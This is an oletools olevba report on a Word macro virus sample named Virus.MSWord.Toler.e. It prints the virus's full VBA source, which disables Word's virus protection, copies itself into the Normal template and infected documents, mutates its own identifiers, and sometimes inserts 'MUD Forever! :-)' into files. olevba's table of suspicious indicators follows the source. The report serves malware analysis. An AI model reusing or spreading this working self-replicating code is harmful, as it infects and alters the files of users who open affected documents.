olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler.e-3631fde42160e0c7bf4c011e85e332432560ca17
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler.e-3631fde42160e0c7bf4c011e85e332432560ca17 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Tolerance!
Private Type LvmfysxwZ
  MasewnZ As Integer
  WpvgaaZ As Integer
  IptjhZ As Boolean
End Type

Private Sub Document_Close()

End Sub

Private Sub Document_New()

End Sub

Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim GlspfkZ As Object, VfatqnhZ As Object
  Set GlspfkZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set VfatqnhZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim JtptaotlZ As LvmfysxwZ, FhbbompbZ As LvmfysxwZ: JtptaotlZ = FtZ(GlspfkZ): FhbbompbZ = FtZ(VfatqnhZ)
  If FhbbompbZ.WpvgaaZ = 0 Then
     OmgqsfjZ GlspfkZ, VfatqnhZ, JtptaotlZ, FhbbompbZ
     Options.SaveNormalPrompt = False
  End If
  If (JtptaotlZ.WpvgaaZ = 0) Or ((FhbbompbZ.WpvgaaZ <> 0) And (JtptaotlZ.WpvgaaZ <> FhbbompbZ.WpvgaaZ)) Then
     OmgqsfjZ VfatqnhZ, GlspfkZ, FhbbompbZ, JtptaotlZ
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub OmgqsfjZ(MasewnZ As Object, YwdlZ As Object, FromP As LvmfysxwZ, ToP As LvmfysxwZ)
  Dim SarlZ As String, EjlhlZ
  SarlZ = MasewnZ.Lines(FromP.MasewnZ, FromP.WpvgaaZ)
  EjlhlZ = Array("SxZ", "LvmfysxwZ", "MasewnZ", "YwdlZ", "VmwvhnqZ", "WpvgaaZ", "IptjhZ", "GlspfkZ", "VfatqnhZ", "JtptaotlZ", "FhbbompbZ", "OmgqsfjZ", "SarlZ", "VifZ", "MxhmxvZ", "LnabcZ", "FtZ", "EctZ", "EjlhlZ")
  For I = 0 To 18: EctZ SarlZ, (EjlhlZ(I)), SxZ(SarlZ): Next I
  If ToP.IptjhZ Then YwdlZ.DeleteLines 1, YwdlZ.CountOfLines
  YwdlZ.AddFromString SarlZ
End Sub
Private Function SxZ(SarlZ As String) As String
  Dim VifZ As String: VifZ = ""
  While (InStr(SarlZ, VifZ) <> 0) Or (Len(VifZ) < 3)
     VifZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(VifZ) = 0 Then
                  VifZ = VifZ + Chr(Int(Rnd * 25 + 65))
            Else: VifZ = VifZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     VifZ = VifZ + "Z"
  Wend
  SxZ = VifZ
End Function
Private Sub EctZ(SarlZ As String, MxhmxvZ As String, LnabcZ As String)
  Dim I As Long
  I = 1
  While InStr(I, SarlZ, MxhmxvZ) <> 0
        I = InStr(I, SarlZ, MxhmxvZ)
        SarlZ = Left(SarlZ, I - 1) + LnabcZ + Mid$(SarlZ, I + Len(MxhmxvZ))
        Index = Index + 1
  Wend
End Sub
Private Function FtZ(VmwvhnqZ As Object) As LvmfysxwZ
  FtZ.MasewnZ = 0
  FtZ.WpvgaaZ = 0
  FtZ.IptjhZ = False
  For I = 1 To VmwvhnqZ.CountOfLines
   If VmwvhnqZ.Lines(I, 1) = "' Tolerance!" Then FtZ.MasewnZ = I
   If VmwvhnqZ.Lines(I, 1) = "End Function 'Tolerance!" Then FtZ.WpvgaaZ = I - FtZ.MasewnZ + 1
   If InStr(VmwvhnqZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then FtZ.IptjhZ = True
  Next I
End Function 'Tolerance!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

